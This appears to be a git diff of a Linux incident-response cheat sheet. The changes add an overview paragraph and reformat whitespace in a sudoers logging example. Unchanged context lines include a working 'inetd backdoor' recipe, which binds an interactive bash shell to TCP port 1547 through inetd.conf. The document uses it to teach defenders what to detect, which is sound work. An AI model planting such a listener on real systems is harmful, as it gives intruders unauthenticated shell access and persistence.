@@ -1,5 +1,8 @@
 ---
 title: "Linux DFIR Cheat Sheet"
+overview: "Linux is often used to provide Dev environments and backend servers, and need to be accounted for along with Windows workstations and servers and network appliances when building a network. 
+
+With the right logging and understanding of the artefacts they provide, you'll have a fighting chance of detecting and responding to intrusions against these assets."
 categories:
   - DFIR
 tags:
@@ -48,7 +51,7 @@ Defaults log_input, log_output, logfile="/var/log/sudo.log"
 ```
 
 For Example:
-```	
+``` 
 #
 # This file MUST be edited with the 'visudo' command as root.
 #
@@ -57,9 +60,9 @@ For Example:
 #
 # See the man page for details on how to write a sudoers file.
 #
-Defaults	env_reset
-Defaults	mail_badpass
-Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+Defaults  env_reset
+Defaults  mail_badpass
+Defaults  secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
 #Logging Settings
 Defaults log_host, log_year
@@ -72,10 +75,10 @@ Defaults log_input, log_output, logfile="/var/log/sudo.log"
 # Cmnd alias specification
 
 # User privilege specification
-root	ALL=(ALL:ALL) ALL
+root  ALL=(ALL:ALL) ALL
 
 # Allow members of group sudo to execute any command
-%sudo	ALL=(ALL:ALL) ALL
+%sudo ALL=(ALL:ALL) ALL
 
 # See sudoers(5) for more information on "#include" directives:
 
@@ -182,13 +185,13 @@ The extended Internet services daemon (xinetd) replaced inetd, performing the sa
 ### Example inetd backdoor:
 ```
 Pick an obscure service from /etc/services associated with a tcp port 1024 and above...for example laplink
-	laplink         1547/tcp     # laplink
+  laplink         1547/tcp     # laplink
 
 Add the following line to /etc/inetd.conf
-	laplink    stream  tcp     nowait  /bin/bash bash -i
+  laplink    stream  tcp     nowait  /bin/bash bash -i
 
 restart inetd.conf
-	$> killall -HUP inetd
+  $> killall -HUP inetd
 
 This creates a listener on port tcp/1547 that will shovel you a bash shell. 
 ```
